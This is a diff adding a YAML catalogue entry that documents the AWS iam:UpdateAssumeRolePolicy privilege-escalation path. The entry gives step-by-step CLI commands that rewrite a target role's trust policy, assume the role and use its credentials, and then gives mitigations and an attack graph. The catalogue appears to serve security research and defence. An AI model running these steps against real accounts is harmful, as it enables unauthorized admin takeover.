@@ -1,0 +1,189 @@
+id: sts-004
+name: iam:UpdateAssumeRolePolicy
+category: principal-access
+services:
+- iam
+- sts
+description: |
+  A principal with `iam:UpdateAssumeRolePolicy` on a target role can modify its trust policy to allow themselves to assume it. The attacker injects their own principal ARN into the trust policy, then assumes the role to escalate to its permissions. This is a self-trust injection attack — the attacker doesn't need the role to already trust them; they simply rewrite the trust policy to grant themselves access.
+prerequisites:
+  admin:
+  - A target role must exist with administrative permissions (e.g., AdministratorAccess)
+  - Attacker must have iam:UpdateAssumeRolePolicy permission on the target role's ARN
+  - Attacker must know the target role's ARN
+  lateral:
+  - A target role must exist in the account
+  - Attacker must have iam:UpdateAssumeRolePolicy permission on the target role's ARN
+  - Attacker must know the target role's ARN
+permissions:
+  required:
+  - permission: iam:UpdateAssumeRolePolicy
+    resourceConstraints: Must have permission to update the trust policy of the target role ARN
+  additional:
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering available roles to target
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing current trust policies and attached permissions on roles
+  - permission: sts:AssumeRole
+    resourceConstraints: Needed to assume the role after trust policy modification (unless the attacker is explicitly named in the trust policy, in which case it is not required)
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: aws sts get-caller-identity
+    description: Identify current principal ARN for injecting into the trust policy
+  - step: 2
+    command: |
+      CURRENT_ARN=$(aws sts get-caller-identity --query Arn --output text)
+      echo "Current ARN: $CURRENT_ARN"
+    description: Capture the current principal ARN to use in the new trust policy
+  - step: 3
+    command: |
+      cat > trust-policy.json <<EOF
+      {
+        "Version": "2012-10-17",
+        "Statement": [
+          {
+            "Effect": "Allow",
+            "Principal": {
+              "AWS": "$CURRENT_ARN"
+            },
+            "Action": "sts:AssumeRole"
+          }
+        ]
+      }
+      EOF
+    description: Create a new trust policy document that allows the attacker's principal to assume the role
+  - step: 4
+    command: |
+      aws iam update-assume-role-policy \
+        --role-name TARGET_ROLE \
+        --policy-document file://trust-policy.json
+    description: Update the target role's trust policy to inject self-trust
+  - step: 5
+    command: sleep 15
+    description: Wait for IAM trust policy changes to propagate
+  - step: 6
+    command: |
+      aws sts assume-role \
+        --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \
+        --role-session-name self-trust-injection
+    description: Assume the target role using the newly injected trust
+  - step: 7
+    command: |
+      export AWS_ACCESS_KEY_ID=<AccessKeyId from step 6>
+      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 6>
+      export AWS_SESSION_TOKEN=<SessionToken from step 6>
+    description: Configure the AWS CLI to use the assumed role credentials
+  - step: 8
+    command: aws sts get-caller-identity
+    description: Verify the assumed role identity
+  - step: 9
+    command: aws iam list-users --max-items 3
+    description: Verify escalated permissions
+recommendation: |
+  Restrict `iam:UpdateAssumeRolePolicy` to break-glass procedures only. This permission allows complete control over who can assume a role, making it extremely dangerous.
+
+  Prevention strategies:
+  ```json
+  {
+    "Effect": "Deny",
+    "Action": "iam:UpdateAssumeRolePolicy",
+    "Resource": "*",
+    "Condition": {
+      "StringNotEquals": {
+        "aws:PrincipalTag/breakglass": "true"
+      }
+    }
+  }
+  ```
+
+  Additional controls:
+  - **Use SCPs** — Deny `iam:UpdateAssumeRolePolicy` broadly across the organization except for specific automation roles
+  - **Restrict to specific roles** — If the permission must be granted, limit the Resource to non-sensitive roles only
+  - **Monitor CloudTrail** — Alert on all `UpdateAssumeRolePolicy` events, especially those adding new principal ARNs
+  - **Detect trust policy drift** — Implement automated checks that compare trust policies against known-good baselines
+  - **Require MFA** — Add MFA condition for any trust policy modifications
+  - **Separate duties** — Ensure principals with `iam:UpdateAssumeRolePolicy` do not also have `sts:AssumeRole` on the same roles (note: if explicitly named in trust, AssumeRole permission is not required)
+limitations: |
+  This path provides access to whatever permissions the target role has. If the attacker can update the trust policy of an admin role, they gain full admin access. Note that when a principal is explicitly named in a trust policy, they can assume the role without separate `sts:AssumeRole` permissions — the trust policy itself grants this capability.
+discoveryAttribution:
+  firstDocumented:
+    author: Paramanand Mallik
+    date: "2026"
+    link: https://github.com/DataDog/pathfinding.cloud/pull/XX
+references:
+- title: AWS Documentation - Modifying a Role Trust Policy
+  url: https://docs.aws.amazon.com/IAM/latest/UserGuide/roles-managingrole-editing-console.html
+- title: HackTricks - AWS IAM Privesc - UpdateAssumeRolePolicy
+  url: https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-iam-privesc/index.html#iamupdateassumerolepolicy
+relatedPaths:
+- sts-001
+- iam-020
+- iam-021
+attackVisualization:
+  nodes:
+  - id: attacker
+    label: Starting Principal
+    type: principal
+    description: |
+      The principal with `iam:UpdateAssumeRolePolicy` permission on the target role. Can be an IAM user or role in the same account.
+  - id: target_role
+    label: Target Privileged Role
+    type: principal
+    description: |
+      An existing IAM role with high privileges. The attacker will modify its trust policy to inject their own principal, then assume the role.
+  - id: admin_outcome
+    label: Effective Administrator
+    type: outcome
+    description: |
+      After injecting self-trust and assuming the role, the attacker gains full administrative access if the target role has AdministratorAccess.
+  - id: partial_outcome
+    label: Some additional access
+    type: outcome
+    color: '#ffeb99'
+    description: |
+      If the target role has elevated but non-admin permissions, the attacker gains those permissions after assuming it.
+  - id: no_outcome
+    label: No additional access
+    type: outcome
+    color: '#cccccc'
+    description: |
+      If the target role has minimal permissions, the trust injection provides little value.
+  edges:
+  - from: attacker
+    to: target_role
+    label: iam:UpdateAssumeRolePolicy + sts:AssumeRole
+    description: |
+      The attacker first modifies the target role's trust policy to add their own principal ARN, then assumes the role. If the attacker is explicitly named in the trust policy, `sts:AssumeRole` permission is not strictly required.
+
+      Commands:
+      ```bash
+      aws iam update-assume-role-policy \
+        --role-name TARGET_ROLE \
+        --policy-document file://trust-policy.json
+
+      aws sts assume-role \
+        --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \
+        --role-session-name self-trust-injection
+      ```
+  - from: target_role
+    to: admin_outcome
+    label: If role has admin permissions
+    branch: A
+    condition: admin
+    description: |
+      The target role has AdministratorAccess or equivalent, granting the attacker full admin access after assuming it.
+  - from: target_role
+    to: partial_outcome
+    label: If role has some permissions
+    branch: B
+    condition: some_permissions
+    description: |
+      The target role has elevated permissions useful for data access or further escalation.
+  - from: target_role
+    to: no_outcome
+    label: If role has minimal permissions
+    branch: C
+    condition: no_permissions
+    description: |
+      The target role has minimal permissions, limiting the impact of the trust injection.
